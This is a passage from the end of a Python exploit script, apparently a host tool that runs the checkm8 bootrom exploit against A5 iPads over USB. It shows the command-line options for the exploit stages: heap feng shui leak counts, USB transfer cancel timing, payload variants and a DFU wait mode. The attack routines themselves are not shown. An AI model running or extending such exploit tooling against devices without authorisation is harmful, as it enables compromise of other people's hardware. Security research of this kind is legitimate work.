    parser = argparse.ArgumentParser(description='checkm8 A5 (S5L8940X) host pwner')
    parser.add_argument('--selftest', action='store_true', help='check payload hashes and exit')
    parser.add_argument('--payload', choices=sorted(PAYLOAD_FILES), default='classic',
                        help='prebuilt A5 payload variant (default: classic)')
    parser.add_argument('--leak', type=int, default=A5_LEAK_COUNT,
                        help='heap feng shui leak count (default: %(default)s)')
    parser.add_argument('--leak-delay-ms', type=float, default=2.0,
                        help='delay between feng shui requests, milliseconds (default: %(default)s)')
    parser.add_argument('--feng-shui-mode', choices=['in-cancel', 'setup-only'],
                        default='in-cancel',
                        help='feng shui request style: in-cancel sends the IN data '
                             'transaction like the Arduino and cancels after the '
                             'first packet; setup-only cancels before the data '
                             'phase (default: %(default)s)')
    parser.add_argument('--spin-us', type=int, default=80,
                        help='abandon deadline for setup-only feng shui requests, '
                             'microseconds (default: %(default)s)')
    parser.add_argument('--init-resets', type=int, default=1,
                        help='USB bus resets before stage 1, like the Arduino '
                             '(default: %(default)s)')
    parser.add_argument('--cancel-at', type=int, default=A5_PADDING,
                        help='stage 2 incomplete DNLOAD: cancel once this many '
                             'bytes are on the wire; 0 = time-based estimate '
                             '(default: %(default)s = 0x6C0)')
    parser.add_argument('--out-spin-us', type=int, default=0,
                        help='abandon deadline override for stage 2/3 abandoned OUT '
                             'transfers, microseconds (0 = default: 3000 ms cap '
                             'for stage 2, 1000 ms for stage 3)')
    parser.add_argument('--write-mode', choices=['complete', 'abandon'], default='complete',
                        help='stage 3 overwrite/payload write style (default: %(default)s)')
    parser.add_argument('--stage', choices=['all', '0', '1', '2', '3', 'verify'], default='all',
                        help='run only one stage (default: all)')
    parser.add_argument('--wait', action='store_true',
                        help='poll sysfs (no USB traffic) until the iPad enters DFU, '
                             'then start the exploit immediately')
    parser.add_argument('--wait-timeout', type=float, default=300.0,
                        help='--wait timeout in seconds (default: %(default)s)')
    parser.add_argument('--debug', action='store_true', help='print raw libusb transfer state')
    args = parser.parse_args()
    if args.selftest:
        return selftest(args)
    return exploit(args)


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
